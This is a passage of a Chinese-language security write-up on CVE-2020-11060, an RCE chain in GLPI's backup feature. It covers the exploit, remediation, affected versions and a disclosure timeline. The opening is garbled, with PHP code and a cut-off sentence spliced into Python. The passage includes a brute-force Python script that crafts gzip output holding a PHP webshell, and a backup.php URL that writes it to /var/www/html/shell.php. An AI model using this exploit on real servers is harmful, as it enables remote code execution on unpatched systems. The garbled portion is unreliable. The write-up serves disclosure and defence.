       if (!is_string($value)) {
          return $value;
       }
       $in  = [''];
       $out = ['&lt;', '&gt;'];
       return str_replace($in, $out, $value);
    }
不幸的是，要打开 [PHP 标签](https://www.php.net/manual/en/language.basic-syntax.phptags.php "PHP tag")必须使用`','2020-04-21 10:55:09','2020-04-21 10:55:09');", 'utf-8')
        beginning_dynamic_block = b'''
    ### Dump table glpi_wifinetworks
    DROP TABLE IF EXISTS `glpi_wifinetworks`;
    CREATE TABLE `glpi_wifinetworks` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `entities_id` int(11) NOT NULL DEFAULT '0',
    `is_recursive` tinyint(1) NOT NULL DEFAULT '0',
    `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
    `essid` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
    `mode` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT 'ad-hoc, access_point',
    `comment` text COLLATE utf8_unicode_ci,
    `date_mod` datetime DEFAULT NULL,
    `date_creation` datetime DEFAULT NULL,
    PRIMARY KEY (`id`),
    KEY `entities_id` (`entities_id`),
    KEY `essid` (`essid`),
    KEY `name` (`name`),
    KEY `date_mod` (`date_mod`),
    KEY `date_creation` (`date_creation`)
    ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
    INSERT INTO `glpi_wifinetworks` VALUES ('1','0','0','PoC','RCE','ad-hoc',\''''
        while True:
            for i in range(16190,16500): #These values are optimized to fill a full block, it fits in the 2¹⁶ bytes limitation
                rand_bytes = gen(i)
                to_compress = b''
                to_compress = beginning_dynamic_block + rand_bytes +  beginning_stored_block
                compressed = compress(to_compress)
                # We want an uncompressed block and the PHP opening tag
                if b'php system' in compressed and b'<?=/*' in compressed:
                        print(compressed)
                        print(rand_bytes)
    if __name__ == "__main__":
        processes = [mp.Process(target=attack) for x in range(8)]
        for p in processes:
            p.start()
在多台服务器上经过了一夜的计算后，得到了一个结果！  
尽管上面的脚本是一个粗糙的、未优化的方法，但计算时间仍然表明，在我们拥有一个基本的PHP
webshell之前，仅对一个动态块进行暴力破解都是相当漫长/昂贵的。
下面是PoC，即插入到WiFi网络条目的备注，这个条目可以在Web界面中创建（同样，前提是攻击者有一个Technician帐户）：  
然后创建压缩的dump:[http://host/front/backup.php?dump=dump&offsettable=312&fichier=/var/www/html/shell.php](http://host/front/backup.php?dump=dump&offsettable=312&fichier=/var/www/html/shell.php)
## Final notes
这里展示的示例假设没有其他已保存的WiFi网络。如果有的话，我们将需要重新生成payload以使其有效。在最坏的情况下，攻击者可以删除它们，拿到shell，然后重新创建WiFi网络。
在没有有效用户的情况下利用漏洞，将作为课后作业留给读者。  
理论上，这个漏洞 _可以_
被没有有效帐户的攻击者利用，因为攻击者可以通过失败登录（日志保存在`glpi_events`表中）将数据添加到数据库中，然后触发CSRF。实际上，盲找到有效PoC可能很难，但也许有人可以做到-如果有的话，请告诉我！
注意：`gzip`和`zlib-flate`命令给出的结果不同，似乎是因为块大小不同。`zlib-flate`给出的结果与PHP的`gzwrite()`相同。
# Remediation
GLPI 9.4.6提供了一个修复版本：备份功能已被删除。  
[相关安全建议。](https://github.com/glpi-project/glpi/security/advisories/GHSA-cvvq-3fww-5v6f "相关安全咨询。")
# Affected versions
2004年7月发布的0.40版本[引入](https://github.com/glpi-project/glpi/commit/05fc4ef5be51914aec1af353efb82d15cd3a78fd
"引入")了利用CSRF并选择文件名（以及通过路径遍历得到的路径）的可能性。[当时](https://github.com/glpi-project/glpi/blob/05fc4ef5be51914aec1af353efb82d15cd3a78fd/backups/index.php
"当时")，SQL dump是用明文编写的，因此很容易获得Webshell，当时GLPI甚至不支持PHP5。
RCE一直有效，直到2006年1月（0.65版）[创建](https://github.com/glpi-project/glpi/commit/6f2375a6fccbed7ad9e39d11589505cefd623ff3 "创建")了anti-XSS功能。从这个时候开始，只有滥用CSRF和任意文件名漏洞才可能被滥用，但是由于`<`字符是编码的，所以不能导致RCE。
最终，2014年4月（0.85版本），GLPI在`backup.php`中[开始使用](https://github.com/glpi-project/glpi/commit/9313b17561a21be849dea543ebebc591c7313581
"开始使用")gzip压缩，在引入漏洞10年后，这使得可以再次利用RCE。此时的`glpi_wifinetworks`表定义略有不同，因此链接的PoC不能按原样工作，但可以很容易地进行调整。
总而言之，虽然备份功能在很长一段时间内都存在安全问题，但本文介绍的漏洞链从2014年发布的0.85版本开始都有效。
# Timeline
**2020-04-27** : 根据[Security Policy](https://github.com/glpi-project/glpi/security/policy "Security Policy")报告漏洞  
**2020-04-28** : 修复[push](https://github.com/glpi-project/glpi/pull/7183/commits/eb8b65f0352fedea1559979b2ca6ad0f64c564ea
"push")进分支9.4/修复漏洞  
**2020-05-05** : [GLPI 9.4.6](https://github.com/glpi-project/glpi/releases/tag/9.4.6 "GLPI 9.4.6")发布  
**2020-05-08** : [CVE-2020-11060](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11060 "CVE-2020-11060")发布  
**2020-05-12** : 发布此漏洞修复建议
# References
以下是一些有助于理解gzip格式的参考资料:
  * [Mark Adler's answers on StackOverflow](https://stackoverflow.com/users/1180620/mark-adler "Mark Adler's answers on StackOverflow")
  * Z[ip Files: History, Explanation and Implementation](https://www.hanshq.net/zip.html "ip Files: History, Explanation and Implementation")
  * [How gzip uses Huffman coding](https://jvns.ca/blog/2015/02/22/how-gzip-uses-huffman-coding/ "How gzip uses Huffman coding")
  * [Understanding zlib](https://www.euccas.me/zlib/ "Understanding zlib")
  * [Dissecting the GZIP format](https://www.infinitepartitions.com/art001.html "Dissecting the GZIP format")